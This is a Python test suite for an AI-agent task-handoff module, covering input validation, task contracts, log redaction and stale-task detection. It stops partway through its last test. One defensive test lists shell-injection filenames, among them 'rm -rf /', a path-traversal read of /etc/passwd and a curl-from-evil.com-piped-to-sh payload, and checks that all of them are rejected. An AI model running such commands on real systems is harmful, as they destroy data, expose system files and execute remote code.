"""Tests for Agent Handoff v2 — agent_tasks module."""

from __future__ import annotations

import json
import os
import subprocess
from pathlib import Path

import pytest

from examples.mcp_server.agent_tasks import (
    agent_task_status,
    archive_agent_task,
    build_current_plan,
    build_initial_status,
    build_task_consensus,
    build_task_json,
    cancel_agent_task,
    inspect_agent_task,
    list_agent_tasks,
    prepare_agent_task_retry,
    read_agent_artifact_tail,
    read_agent_log_tail,
    read_agent_task_file,
    validate_base_ref,
    validate_filename,
    validate_required_checks,
    validate_scope_contract,
    validate_task_id,
    validate_workflow_phase,
    write_agent_task,
)


class TestValidateTaskId:
    def test_valid_ids(self):
        for tid in [
            "2026-06-24-stage-12-15a-rag-search-chunks-opencode",
            "a12345678901",
            "fix-test-flake-auth-mimo",
        ]:
            validate_task_id(tid)

    def test_invalid_ids(self):
        for tid in ["", "too-short", "UPPERCASE", "has spaces", "ä", None]:
            with pytest.raises((ValueError, TypeError)):
                validate_task_id(tid)  # type: ignore[arg-type]


class TestValidateBaseRef:
    SHA1 = "a" * 40
    SHA256 = "b" * 64

    def test_none_and_empty_accepted(self):
        validate_base_ref(None)
        validate_base_ref("")

    def test_full_40_hex_accepted(self):
        validate_base_ref(self.SHA1)

    def test_full_64_hex_accepted(self):
        validate_base_ref(self.SHA256)

    def test_mixed_case_full_hex_accepted(self):
        validate_base_ref("A" * 40)
        validate_base_ref("aBcDeF" * 6 + "aBcD")

    def test_rejects_short_or_partial_hex(self):
        for bad in ["a" * 39, "a" * 41, "b" * 63, "b" * 65]:
            with pytest.raises(ValueError):
                validate_base_ref(bad)

    def test_rejects_non_hex(self):
        for bad in ["g" * 40, "a" * 39 + "x", "z" * 64]:
            with pytest.raises(ValueError):
                validate_base_ref(bad)

    def test_rejects_refs_and_fragments(self):
        for bad in ["HEAD", "main", "main~1", "origin/main", "a" * 7]:
            with pytest.raises(ValueError):
                validate_base_ref(bad)

    def test_rejects_non_string(self):
        with pytest.raises(TypeError):
            validate_base_ref(123)  # type: ignore[arg-type]

    def test_build_task_json_rejects_invalid_base_ref(self):
        with pytest.raises(ValueError):
            build_task_json(task_id="a12345678901", agent="opencode", base_ref="main")


class TestValidateRequiredChecks:
    def test_rejects_acceptance_prose_with_clear_message(self):
        prose = [
            "No file modifications; report findings only.",
            "Run targeted tests and Ruff for changed files.",
        ]
        for entry in prose:
            with pytest.raises(ValueError) as exc_info:
                validate_required_checks([entry])
            assert "looks like acceptance prose" in str(exc_info.value)
            assert "acceptance_criteria" in str(exc_info.value)

    def test_accepts_legitimate_commands(self):
        legit = [
            "tox -q",
            "poetry run pytest -q",
            "uv run pytest -q",
            "FOO=1 BAR=2 pytest -q",
            "PYTHONPATH=. .venv/bin/python -m pytest tests -q",
            "./scripts/check.sh",
            "pytest -q",
            "ruff check",
            "pytest tests/test_agent_tasks.py tests/test_agent_paths.py -q",
            "pytest && ruff check tests/",
            "ruff check . && pytest -q | tee pytest.log",
            "git add .",
            "make check",
        ]
        for entry in legit:
            validate_required_checks([entry])

    def test_rejects_non_string_and_empty_entries(self):
        for bad in [None, "", "   ", "   \n\t", 42, ["nested"]]:
            with pytest.raises((TypeError, ValueError)):
                validate_required_checks([bad])  # type: ignore[list-item]

    def test_rejects_invalid_shell_syntax(self):
        for bad in ["pytest 'unterminated", "ruff check &&", "pytest |", "tox >"]:
            with pytest.raises(ValueError):
                validate_required_checks([bad])

    def test_rejects_non_list_input(self):
        with pytest.raises(TypeError):
            validate_required_checks("pytest -q")  # type: ignore[arg-type]

    def test_accepts_none_and_empty_list(self):
        validate_required_checks(None)
        validate_required_checks([])

    def test_build_task_json_rejects_prose(self):
        with pytest.raises(ValueError) as exc_info:
            build_task_json(
                task_id="a12345678901",
                agent="opencode",
                required_checks=["No file modifications; report findings only."],
            )
        assert "acceptance_criteria" in str(exc_info.value)

    def test_build_current_plan_rejects_prose(self):
        with pytest.raises(ValueError):
            build_current_plan(
                task_id="a12345678901",
                task="Fix tests",
                required_checks=["Run targeted tests and Ruff for changed files."],
            )

    def test_acceptance_criteria_remains_unrestricted(self):
        result = build_current_plan(
            task_id="a12345678901",
            task="Fix tests",
            acceptance_criteria=["No file modifications; report findings only."],
        )
        assert "No file modifications; report findings only." in result


class TestValidateScopeContract:
    def test_rejects_global_forbidden_with_nonempty_allowlist(self):
        for pattern in ["*", "**", "**/*"]:
            with pytest.raises(ValueError):
                validate_scope_contract(["app/**"], [pattern])

    def test_rejects_exact_overlap(self):
        with pytest.raises(ValueError):
            validate_scope_contract(["app/routers/jobs.py"], ["app/routers/jobs.py"])

    def test_accepts_nonconflicting_scope(self):
        validate_scope_contract(["app/**", "tests/**"], ["migrations/**"])

    def test_build_task_json_rejects_contradictory_scope(self):
        with pytest.raises(ValueError):
            build_task_json(
                task_id="a12345678901",
                agent="opencode",
                allowed_files=["app/routers/jobs.py"],
                forbidden_files=["**/*"],
            )


class TestValidateWorkflowPhase:
    def test_default_and_normalization(self):
        assert validate_workflow_phase(None) == "implementation"
        assert validate_workflow_phase("") == "implementation"
        assert validate_workflow_phase(" Validation ") == "validation"
        assert validate_workflow_phase(" REVIEW ") == "review"

    def test_rejects_unknown_phase(self):
        with pytest.raises(ValueError):
            validate_workflow_phase("brainstorm")


class TestBuildTaskJson:
    def test_minimal(self):
        result = build_task_json(task_id="a12345678901", agent="opencode")
        data = json.loads(result)
        assert data["task_id"] == "a12345678901"
        assert data["agent"] == "opencode"
        assert data["allowed_backends"] == ["opencode"]
        assert data["allowed_files"] == []
        assert data["workflow_phase"] == "implementation"
        assert data["commit_allowed"] is False
        assert "created" in data

    def test_minimal_base_ref_defaults_to_empty_string(self):
        data = json.loads(build_task_json(task_id="a12345678901", agent="opencode"))
        assert data["base_ref"] == ""

    def test_full(self):
        result = build_task_json(
            task_id="b23456789012",
            agent="opencode",
            allowed_files=["src/**", "tests/**"],
            forbidden_files=["migrations/**"],
            required_checks=["pytest -q", "ruff check"],
            worktree_path="../agent-worktrees/task-b",
            commit_allowed=False,
            push_allowed=False,
            workflow_phase="validation",
        )
        data = json.loads(result)
        assert data["agent"] == "opencode"
        assert data["allowed_backends"] == ["opencode"]
        assert "src/**" in data["allowed_files"]
        assert data["required_checks"] == ["pytest -q", "ruff check"]
        assert data["workflow_phase"] == "validation"

    def test_review_phase_is_persisted_and_rejects_mutation_flags(self):
        data = json.loads(
            build_task_json(
                task_id="b23456789012",
                agent="opencode",
                allowed_files=["src/**"],
                workflow_phase="review",
            )
        )
        assert data["workflow_phase"] == "review"
        assert data["allowed_files"] == ["src/**"]
        assert data["commit_allowed"] is False
        assert data["push_allowed"] is False

        for kwargs in ({"commit_allowed": True}, {"push_allowed": True}):
            with pytest.raises(ValueError, match="review workflow"):
                build_task_json(
                    task_id="b23456789012",
                    agent="opencode",
                    workflow_phase="review",
                    **kwargs,
                )

    def test_accepts_base_ref(self):
        sha = "c" * 40
        data = json.loads(build_task_json(task_id="b23456789012", agent="opencode", base_ref=sha))
        assert data["base_ref"] == sha

    def test_accepts_64_hex_base_ref(self):
        sha = "d" * 64
        data = json.loads(build_task_json(task_id="b23456789012", agent="opencode", base_ref=sha))
        assert data["base_ref"] == sha

    def test_committed_head_defaults_source_ref_to_base_ref(self):
        sha = "e" * 40
        data = json.loads(
            build_task_json(task_id="b23456789012", agent="opencode", base_ref=sha)
        )
        assert data["source_mode"] == "committed_head"
        assert data["source_ref"] == sha
        assert data["source_tree_sha"] == ""

    def test_dirty_snapshot_persists_exact_provenance(self):
        base_ref = "1" * 40
        source_ref = "2" * 40
        tree_sha = "3" * 40
        digest = "4" * 64
        data = json.loads(
            build_task_json(
                task_id="b23456789012",
                agent="opencode",
                base_ref=base_ref,
                source_mode="dirty_worktree_snapshot",
                source_ref=source_ref,
                source_tree_sha=tree_sha,
                managed_source_sha256=digest,
            )
        )
        assert data["base_ref"] == base_ref
        assert data["source_mode"] == "dirty_worktree_snapshot"
        assert data["source_ref"] == source_ref
        assert data["source_tree_sha"] == tree_sha
        assert data["managed_source_sha256"] == digest

    @pytest.mark.parametrize(
        "kwargs",
        [
            {"base_ref": "1" * 40},
            {"base_ref": "1" * 40, "source_ref": "2" * 40},
            {
                "base_ref": "1" * 40,
                "source_ref": "2" * 40,
                "source_tree_sha": "3" * 40,
            },
        ],
    )
    def test_dirty_snapshot_rejects_incomplete_provenance(self, kwargs):
        with pytest.raises(ValueError):
            build_task_json(
                task_id="b23456789012",
                agent="opencode",
                source_mode="dirty_worktree_snapshot",
                **kwargs,
            )

    def test_committed_head_rejects_distinct_source_ref(self):
        with pytest.raises(ValueError, match="source_ref must equal base_ref"):
            build_task_json(
                task_id="b23456789012",
                agent="opencode",
                base_ref="1" * 40,
                source_mode="committed_head",
                source_ref="2" * 40,
            )


class TestWriteAgentTask:
    def _fake_run_cmd(self):
        calls = []

        def fake_run_cmd(project: str, command: str) -> dict:
            calls.append((project, command))
            return {"stdout": "ok", "stderr": "", "exit_code": 0}

        return fake_run_cmd, calls

    @staticmethod
    def _decoded_payload(script: str, filename: str) -> str:
        import base64

        line = next(line for line in script.splitlines() if line.endswith(f"/{filename}"))
        encoded = line.split("printf %s ", 1)[1].split(" | base64 -d", 1)[0]
        return base64.b64decode(encoded).decode("utf-8")

    def test_writes_base_ref_to_task_json_and_base_ref_txt(self):
        sha = "e" * 40
        fake_run_cmd, calls = self._fake_run_cmd()
        write_agent_task(fake_run_cmd, project="my-proj", task_id="a12345678901", agent="opencode", task="Pin base ref", base_ref=sha)
        script = calls[0][1]
        contract = json.loads(self._decoded_payload(script, "task.json"))
        assert contract["base_ref"] == sha
        assert self._decoded_payload(script, "base-ref.txt") == sha

    def test_omitted_base_ref_stays_backward_compatible(self):
        fake_run_cmd, calls = self._fake_run_cmd()
        write_agent_task(fake_run_cmd, project="my-proj", task_id="a12345678901", agent="opencode", task="No base ref")
        script = calls[0][1]
        contract = json.loads(self._decoded_payload(script, "task.json"))
        assert contract["base_ref"] == ""
        assert "base-ref.txt" not in script

    def test_writes_consensus_and_workflow_phase(self):
        fake_run_cmd, calls = self._fake_run_cmd()
        write_agent_task(
            fake_run_cmd,
            project="my-proj",
            task_id="a12345678901",
            agent="opencode",
            task="Implement handoff",
            workflow_phase="validation",
        )
        script = calls[0][1]
        contract = json.loads(self._decoded_payload(script, "task.json"))
        assert contract["workflow_phase"] == "validation"
        plan = self._decoded_payload(script, "current-plan.md")
        assert "Current phase: `validation`" in plan
        assert "pure discussion is not a sufficient deliverable" in plan
        consensus = self._decoded_payload(script, "consensus.md")
        assert "# Agent consensus" in consensus
        assert "Workflow phase: validation" in consensus
        assert "GO/NO-GO" in consensus

    def test_invalid_base_ref_raises_before_script(self):
        fake_run_cmd, calls = self._fake_run_cmd()
        with pytest.raises(ValueError):
            write_agent_task(fake_run_cmd, project="my-proj", task_id="a12345678901", agent="opencode", task="Bad base ref", base_ref="main")
        assert calls == []


class TestBuildInitialStatus:
    def test_created_status(self):
        result = build_initial_status(agent="opencode", task_id="a12345678901")
        assert "Status: created" in result
        assert "opencode" in result
        assert "a12345678901" in result

    def test_different_agent(self):
        result = build_initial_status(agent="custom-agent", task_id="b23456789012")
        assert "Status: created" in result
        assert "custom-agent" in result


class TestBuildTaskConsensus:
    def test_builds_operator_baton_state(self):
        result = build_task_consensus(
            task_id="c34567890123",
            task="Fix tests",
            workflow_phase="validation",
        )
        assert "# Agent consensus" in result
        assert "Workflow phase: validation" in result
        assert "GO/NO-GO" in result
        assert "Do not re-litigate settled decisions" in result

    def test_review_consensus_is_terminal_and_evidence_only(self):
        result = build_task_consensus(
            task_id="c34567890123",
            task="Audit lifecycle",
            workflow_phase="review",
        )
        assert "Workflow phase: review" in result
        assert "final review report" in result
        assert "must not modify source files" in result
        assert "must be empty" in result
        assert "Move to implementation" not in result


class TestBuildCurrentPlan:
    def test_minimal(self):
        result = build_current_plan(task_id="c34567890123", task="Fix tests")
        assert "# Fix tests" in result
        assert "c34567890123" in result
        assert "implementation-diff.patch" in result
        assert "consensus.md" in result
        assert "Current phase: `implementation`" in result
        assert "Do not commit or push" in result

    def test_full(self):
        result = build_current_plan(
            task_id="d45678901234",
            task="Add search chunks",
            scope="UI only",
            allowed_files=["father-ui/src/**"],
            forbidden_files=["app/**"],
            required_checks=["pytest -q"],
            acceptance_criteria=["Build passes", "Tests pass"],
            commit_message="polish: improve RAG search",
            constraints="No model changes",
        )
        assert "## Scope" in result
        assert "father-ui/src/**" in result
        assert "app/**" in result
        assert "polish: improve RAG search" in result
        assert "No model changes" in result

    def test_review_plan_is_read_only_terminal_contract(self):
        result = build_current_plan(
            task_id="d45678901234",
            task="Audit lifecycle",
            scope="Read lifecycle code and report findings",
            allowed_files=["examples/mcp_server/agent_tasks.py"],
            required_checks=["git status --short"],
            workflow_phase="review",
        )
        assert "Current phase: `review`" in result
        assert "evidence-only and terminal" in result
        assert "without modifying source files" in result
        assert "agent-report.md" in result
        assert "implementation-diff.patch` empty" in result
        assert "Do not implement, commit, push, or create branches" in result
        assert "Forced convergence: discovery" not in result
        assert "After each meaningful change" not in result

    def test_review_plan_rejects_commit_message(self):
        with pytest.raises(ValueError, match="review workflow"):
            build_current_plan(
                task_id="d45678901234",
                task="Audit lifecycle",
                workflow_phase="review",
                commit_message="must-not-exist",
            )


class TestReadAgentTaskFile:
    def test_returns_callable_result(self):
        calls = []

        def fake_run_cmd(project: str, command: str) -> dict:
            calls.append((project, command))
            return {"stdout": "file content", "stderr": "", "exit_code": 0}

        result = read_agent_task_file(
            fake_run_cmd,
            project="my-proj",
            task_id="a12345678901",
            filename="agent-status.md",
        )
        assert result["stdout"] == "file content"
        assert calls == [
            ("my-proj", "ls -ld -- .ai-bridge"),
            ("my-proj", "ls -ld -- .ai-bridge/tasks"),
            ("my-proj", "ls -ld -- .ai-bridge/tasks/a12345678901"),
            ("my-proj", "ls -ld -- .ai-bridge/tasks/a12345678901/agent-status.md"),
            ("my-proj", "cat .ai-bridge/tasks/a12345678901/agent-status.md"),
        ]

    def test_rejects_shell_injection_in_filename(self):
        calls = []

        def fake_run_cmd(project: str, command: str) -> dict:
            calls.append((project, command))
            return {"stdout": "should never run", "stderr": "", "exit_code": 0}

        for malicious in [
            "x; rm -rf /",
            "x$(whoami)",
            "x`whoami`",
            "../../../etc/passwd",
            "x && curl evil.com | sh",
        ]:
            with pytest.raises(ValueError):
                read_agent_task_file(
                    fake_run_cmd,
                    project="my-proj",
                    task_id="a12345678901",
                    filename=malicious,
                )
        assert calls == []

    def test_accepts_safe_filenames(self):
        for name in ["agent-status.md", "agent-report.md", "implementation-diff.patch"]:
            validate_filename(name)


class TestReadAgentArtifactTail:
    def test_reads_allowlisted_artifact_with_bounds_redaction_and_metadata(self):
        calls: list[str] = []
        task_id = "a12345678901"

        def fake_run_cmd(project: str, command: str) -> dict:
            calls.append(command)
            if command.startswith("ls -ld -- "):
                return {"stdout": "drwxr-xr-x 1 user user 0 path\n", "stderr": "", "exit_code": 0}
            if command.startswith("tail -c "):
                return {
                    "stdout": (
                        "one\n"
                        "two\n"
                        "token=secret-value\n"
                        "proxy=http://user:pass@proxy.local:8080?token=raw\n"
                        f"path=.ai-bridge/tasks/{task_id}/agent-report.md\n"
                    ),
                    "stderr": "password=stderr-secret",
                    "exit_code": 0,
                }
            raise AssertionError(f"unexpected command: {command}")

        result = read_agent_artifact_tail(
            fake_run_cmd,
            project="my-proj",
            task_id=task_id,
            artifact="report",
            tail_lines=3,
            max_bytes=400,
        )

        assert result["artifact"] == "report"
        assert result["filename"] == "agent-report.md"
        assert result["available"] is True
        assert result["truncated"] is True
        assert result["redacted"] is True
        assert "token=secret-value" not in result["stdout"]
        assert "token=<redacted>" in result["stdout"]
        assert "user:pass" not in result["stdout"]
        assert "proxy.local" not in result["stdout"]
        assert "proxy=<redacted-url>" in result["stdout"]
        assert "<agent-task>/agent-report.md" in result["stdout"]
        assert result["stderr"] == "password=<redacted>"
        assert calls[-1] == "tail -c 401 -- .ai-bridge/tasks/a12345678901/agent-report.md"

    def test_accepts_exact_allowlisted_filename_alias(self):
        def fake_run_cmd(project: str, command: str) -> dict:
            if command.startswith("ls -ld -- "):
                return {"stdout": "drwxr-xr-x 1 user user 0 path\n", "stderr": "", "exit_code": 0}
            return {"stdout": "diff --git a/a b/a\n", "stderr": "", "exit_code": 0}

        result = read_agent_artifact_tail(
            fake_run_cmd,
            project="my-proj",
            task_id="a12345678901",
            artifact="implementation-diff.patch",
            tail_lines=10,
            max_bytes=100,
        )

        assert result["artifact"] == "diff"
        assert result["filename"] == "implementation-diff.patch"
        assert result["stdout"] == "diff --git a/a b/a\n"

    def test_missing_or_unsafe_artifact_returns_structured_unavailable_without_tail(self):
        calls: list[str] = []

        def fake_run_cmd(project: str, command: str) -> dict:
            calls.append(command)
            if command.startswith("ls -ld -- "):
                return {"stdout": "", "stderr": "No such file or directory", "exit_code": 1}
            raise AssertionError("tail must not run when path safety failed")

        result = read_agent_artifact_tail(
            fake_run_cmd,
            project="my-proj",
            task_id="a12345678901",
            artifact="required-checks",
        )

        assert result["available"] is False
        assert result["exit_code"] == 0
        assert result["stdout"] == ""
        assert result["log_unavailable"] == {"reason": "not_found_or_unsafe_path"}
        assert result["artifact_unavailable"] == {"reason": "not_found_or_unsafe_path"}
        assert not any(command.startswith("tail -c ") for command in calls)

    def test_rejects_unsupported_artifact_before_command(self):
        calls: list[tuple[str, str]] = []
        with pytest.raises(ValueError):
            read_agent_artifact_tail(
                lambda project, command: calls.append((project, command)),
                project="my-proj",
                task_id="a12345678901",
                artifact="../../../etc/passwd",
            )
        assert calls == []

    @pytest.mark.parametrize("tail_lines", [0, 1001, -1, True])
    def test_rejects_invalid_tail_lines_before_command(self, tail_lines):
        calls: list[tuple[str, str]] = []
        with pytest.raises((TypeError, ValueError)):
            read_agent_artifact_tail(
                lambda project, command: calls.append((project, command)),
                project="my-proj",
                task_id="a12345678901",
                artifact="log",
                tail_lines=tail_lines,
            )
        assert calls == []


class TestReadAgentLogTail:
    def test_reads_fixed_bounded_log_and_tails_lines(self):
        calls = []

        def fake_run_cmd(project: str, command: str) -> dict:
            calls.append((project, command))
            return {"stdout": "one\ntwo\nthree\n", "stderr": "", "exit_code": 0}

        result = read_agent_log_tail(
            fake_run_cmd,
            project="my-proj",
            task_id="a12345678901",
            tail_lines=2,
        )

        assert result["stdout"] == "two\nthree\n"
        assert result["truncated"] is True
        assert calls == [
            ("my-proj", "ls -ld -- .ai-bridge"),
            ("my-proj", "ls -ld -- .ai-bridge/tasks"),
            ("my-proj", "ls -ld -- .ai-bridge/tasks/a12345678901"),
            ("my-proj", "ls -ld -- .ai-bridge/tasks/a12345678901/opencode-output.log"),
            (
                "my-proj",
                "tail -c 65537 -- .ai-bridge/tasks/a12345678901/opencode-output.log",
            ),
        ]

    def test_strips_ansi_and_executor_owned_paths(self, monkeypatch):
        from examples.mcp_server.agent_paths import managed_workspace_path, task_dir

        monkeypatch.setenv("MCP_AGENT_STATE_ROOT", "/var/lib/mcp-agent/state")
        monkeypatch.setenv("MCP_AGENT_WORKSPACE_ROOT", "/var/lib/mcp-agent/workspaces")
        project = "my-proj"
        task_id = "a12345678901"
        td = task_dir(project, task_id)
        wt = managed_workspace_path(project, task_id)
        assert wt is not None

        result = read_agent_log_tail(
            lambda _p, _c: {
                "stdout": f"\x1b[0m→ Read {td}/current-plan.md\ncd {wt}\n",
                "stderr": "",
                "exit_code": 0,
            },
            project=project,
            task_id=task_id,
        )

        assert "\x1b" not in result["stdout"]
        assert "/var/lib/mcp-agent" not in result["stdout"]
        assert "<agent-task>/current-plan.md" in result["stdout"]

    def test_strips_executor_owned_paths_from_success_stderr(self, monkeypatch):
        from examples.mcp_server.agent_paths import task_dir

        monkeypatch.setenv("MCP_AGENT_STATE_ROOT", "/var/lib/mcp-agent/state")
        project = "my-proj"
        task_id = "a12345678901"
        td = task_dir(project, task_id)

        def fake_run(_project, command):
            if command.startswith("ls -ld -- "):
                return {
                    "stdout": "drwxr-xr-x 1 user user 0 path\n",
                    "stderr": "",
                    "exit_code": 0,
                }
            return {
                "stdout": "ok\n",
                "stderr": f"warning while reading {td}/opencode-output.log",
                "exit_code": 0,
            }

        result = read_agent_log_tail(
            fake_run,
            project=project,
            task_id=task_id,
        )

        assert "/var/lib/mcp-agent" not in result["stderr"]
        assert "<agent-task>/opencode-output.log" in result["stderr"]

    def test_redacts_urls_and_secrets_from_live_log_surface(self):
        def fake_run(_project, command):
            if command.startswith("ls -ld -- "):
                return {
                    "stdout": "-rw------- 1 user user 1 path\n",
                    "stderr": "",
                    "exit_code": 0,
                }
            return {
                "stdout": (
                    "proxy=https://user:pass@proxy.local:8080/v1?token=raw\n"
                    "token=secret-value\n"
                ),
                "stderr": "password=stderr-secret",
                "exit_code": 0,
            }

        result = read_agent_log_tail(
            fake_run,
            project="my-proj",
            task_id="a12345678901",
        )

        assert "user:pass" not in result["stdout"]
        assert "proxy.local" not in result["stdout"]
        assert "secret-value" not in result["stdout"]
        assert result["stdout"] == "proxy=<redacted-url>\ntoken=<redacted>\n"
        assert result["stderr"] == "password=<redacted>"

    @pytest.mark.parametrize("tail_lines", [0, 1001, -1, True])
    def test_rejects_invalid_line_count_before_command(self, tail_lines):
        calls = []
        with pytest.raises((TypeError, ValueError)):
            read_agent_log_tail(
                lambda project, command: calls.append((project, command)),
                project="my-proj",
                task_id="a12345678901",
                tail_lines=tail_lines,
            )
        assert calls == []

    def test_missing_log_is_not_an_error(self):
        result = read_agent_log_tail(
            lambda _p, _c: {"stdout": "", "stderr": "missing", "exit_code": 1},
            project="my-proj",
            task_id="a12345678901",
        )
        assert result["stdout"] == "(not found)"
        assert result["exit_code"] == 0
        assert result["truncated"] is False


class TestAgentTaskStatus:
    @staticmethod
    def _shell_runner(cwd):
        def run_cmd(_project: str, command: str) -> dict:
            result = subprocess.run(
                ["sh", "-c", command],
                cwd=cwd,
                text=True,
                capture_output=True,
                check=False,
            )
            return {
                "stdout": result.stdout,
                "stderr": result.stderr,
                "exit_code": result.returncode,
            }

        return run_cmd

    def test_lost_job_snapshot_escalates_without_claiming_worker_terminated(
        self, tmp_path, monkeypatch
    ):
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        task_id = "a12345678901"
        now = 2_000
        td = tmp_path / ".ai-bridge" / "tasks" / task_id
        td.mkdir(parents=True)
        (td / "agent-status.md").write_text("Status: running\n", encoding="utf-8")
        (td / "attempt-state.json").write_text(
            json.dumps({"attempt_id": "attempt-1", "fingerprint": "fp", "job_id": "job-1"}),
            encoding="utf-8",
        )
        for child in td.iterdir():
            os.utime(child, (now - 900, now - 900))

        def lost_job_status(job_id):
            raise RuntimeError(f"JOB_NOT_FOUND for {job_id}")

        result = agent_task_status(
            self._shell_runner(tmp_path),
            project="my-proj",
            task_id=task_id,
            stale_after_seconds=600,
            now_epoch=now,
            job_status=lost_job_status,
        )

        assert result["verdict"] == "lost_after_restart"
        assert result["log_included"] is False
        assert result["job"]["worker_termination_proven"] is False
        assert result["reconciliation"]["worker_termination_proven"] is False
        assert result["next"]["inspect_agent_task"]["task_id"] == task_id

    def test_running_snapshot_omits_log_tail(self, tmp_path, monkeypatch):
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        task_id = "a12345678901"
        now = 2_000
        td = tmp_path / ".ai-bridge" / "tasks" / task_id
        td.mkdir(parents=True)
        (td / "agent-status.md").write_text("Status: running\n\nWorking\n", encoding="utf-8")
        (td / "opencode-output.log").write_text("token=should-not-be-read\n", encoding="utf-8")
        (td / "attempt-state.json").write_text(
            json.dumps({"attempt_id": "attempt-1", "fingerprint": "fp", "job_id": "job-1"}),
            encoding="utf-8",
        )
        (td / "agent-heartbeat.json").write_text(
            json.dumps(
                {
                    "version": 1,
                    "state": "running",
                    "phase": "loop",
                    "updated_at": "2026-09-03T12:00:00Z",
                    "updated_epoch": now - 5,
                    "runner_pid": 123,
                    "exit_code": None,
                }
            ),
            encoding="utf-8",
        )
        for child in td.iterdir():
            os.utime(child, (now - 10, now - 10))
        os.utime(td / "agent-heartbeat.json", (now - 5, now - 5))

        result = agent_task_status(
            self._shell_runner(tmp_path),
            project="my-proj",
            task_id=task_id,
            stale_after_seconds=600,
            now_epoch=now,
            job_status=lambda job_id: {"job_id": job_id, "status": "running"},
        )

        assert result["exists"] is True
        assert result["status"] == "running"
        assert result["job"]["status"] == "running"
        assert result["verdict"] == "running"
        assert result["terminal"] is False
        assert result["likely_hung"] is False
        assert result["log_included"] is False
        assert "log" not in result
        assert "opencode-output.log" not in str(result)
        assert "should-not-be-read" not in str(result)
        assert result["next"]["agent_status"]["task_id"] == task_id
        assert result["next"]["job_status"] == {"job_id": "job-1"}
        assert "inspect_agent_task" not in result["next"]

    def test_likely_hung_snapshot_escalates_without_tail_call(self):
        now = 2_000
        calls: list[str] = []

        def fake_run_cmd(project: str, command: str) -> dict:
            calls.append(command)
            if command.startswith("tail -c "):
                raise AssertionError("agent_status must not read log tails")
            if command.startswith("ls -ld -- "):
                return {"stdout": "drwxr-xr-x 1 user user 0 path\n", "stderr": "", "exit_code": 0}
            if command.startswith("cat ") and "agent-status.md" in command:
                return {"stdout": "Status: running\n", "stderr": "", "exit_code": 0}
            if command.startswith("cat ") and "attempt-state.json" in command:
                return {
                    "stdout": json.dumps({"attempt_id": "attempt-1", "fingerprint": "fp", "job_id": "job-1"}),
                    "stderr": "",
                    "exit_code": 0,
                }
            if command.startswith("cat "):
                return {"stdout": "(not found)", "stderr": "", "exit_code": 1}
            if command.startswith("stat -c "):
                if "agent-heartbeat.json" in command or "agent-report.md" in command or "implementation-diff.patch" in command:
                    return {"stdout": "", "stderr": "not found", "exit_code": 1}
                return {"stdout": f"20 {now - 700}\n", "stderr": "", "exit_code": 0}
            return {"stdout": "", "stderr": "", "exit_code": 1}

        result = agent_task_status(
            fake_run_cmd,
            project="my-proj",
            task_id="a12345678901",
            stale_after_seconds=600,
            now_epoch=now,
            job_status=lambda job_id: {"job_id": job_id, "status": "running"},
        )

        assert result["verdict"] == "likely_hung"
        assert result["likely_hung"] is True
        assert result["log_included"] is False
        assert result["next"]["inspect_agent_task"]["task_id"] == "a12345678901"
        assert not any(command.startswith("tail -c ") for command in calls)

    def test_fresh_log_and_heartbeat_cannot_mask_stale_semantic_progress(
        self, tmp_path, monkeypatch
    ):
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        task_id = "a12345678901"
        now = 2_000
        td = tmp_path / ".ai-bridge" / "tasks" / task_id
        td.mkdir(parents=True)
        (td / "agent-status.md").write_text("Status: running\n\nWorking\n", encoding="utf-8")
        (td / "opencode-output.log").write_text("keepalive\n", encoding="utf-8")
        (td / "attempt-state.json").write_text(
            json.dumps(
                {"attempt_id": "attempt-1", "fingerprint": "fp", "job_id": "job-1"}
            ),
            encoding="utf-8",
        )
        (td / "agent-heartbeat.json").write_text(
            json.dumps(
                {
                    "version": 1,
                    "state": "running",
                    "phase": "loop",
                    "updated_at": "2026-09-03T12:00:00Z",
                    "updated_epoch": now - 5,
                    "runner_pid": 123,
                    "exit_code": None,
                }
            ),
            encoding="utf-8",
        )
        for child in td.iterdir():
            os.utime(child, (now - 700, now - 700))
        # Only log/heartbeat bookkeeping and attempt-state are fresh. Semantic
        # progress is stale, so the lightweight surface must still flag hung.
        os.utime(td / "opencode-output.log", (now - 1, now - 1))
        os.utime(td / "agent-heartbeat.json", (now - 5, now - 5))
        os.utime(td / "attempt-state.json", (now - 5, now - 5))

        result = agent_task_status(
            self._shell_runner(tmp_path),
            project="my-proj",
            task_id=task_id,
            stale_after_seconds=600,
            now_epoch=now,
            job_status=lambda job_id: {"job_id": job_id, "status": "running"},
        )

        assert result["runner_heartbeat_fresh"] is True
        assert result["last_useful_activity"]["age_seconds"] == 700
        assert result["likely_hung"] is True
        assert result["verdict"] == "likely_hung"
        assert result["next"]["inspect_agent_task"]["task_id"] == task_id

    def test_fresh_zero_byte_evidence_does_not_mask_stale_semantic_progress_or_completion(
        self, tmp_path, monkeypatch
    ):
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        task_id = "a12345678901"
        now = 2_000
        td = tmp_path / ".ai-bridge" / "tasks" / task_id
        td.mkdir(parents=True)
        (td / "agent-status.md").write_text("Status: running\n", encoding="utf-8")
        (td / "attempt-state.json").write_text(
            json.dumps({"attempt_id": "attempt-1", "fingerprint": "fp", "job_id": "job-1"}),
            encoding="utf-8",
        )
        (td / "agent-report.md").write_text("", encoding="utf-8")
        (td / "implementation-diff.patch").write_text("", encoding="utf-8")
        for child in td.iterdir():
            os.utime(child, (now - 700, now - 700))
        os.utime(td / "agent-report.md", (now - 1, now - 1))
        os.utime(td / "implementation-diff.patch", (now - 1, now - 1))

        def lost_job_status(job_id):
            raise RuntimeError(f"JOB_NOT_FOUND for {job_id}")

        result = agent_task_status(
            self._shell_runner(tmp_path),
            project="my-proj",
            task_id=task_id,
            stale_after_seconds=600,
            now_epoch=now,
            job_status=lost_job_status,
        )

        assert result["last_activity"]["age_seconds"] <= 1
        assert result["last_useful_activity"]["source"] == "status"
        assert result["last_useful_activity"]["age_seconds"] == 700
        assert result["reconciliation"]["artifact_incomplete"] is True
        assert result["verdict"] == "lost_after_restart"
        assert result["likely_hung"] is True

    def test_terminal_server_error_sidecar_sets_typed_verdict_without_reading_log(
        self, tmp_path, monkeypatch
    ):
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        task_id = "a12345678901"
        now = 2_000
        td = tmp_path / ".ai-bridge" / "tasks" / task_id
        td.mkdir(parents=True)
        (td / "agent-status.md").write_text("Status: failed\n", encoding="utf-8")
        (td / "opencode-output.log").write_text("must-not-be-read\n", encoding="utf-8")
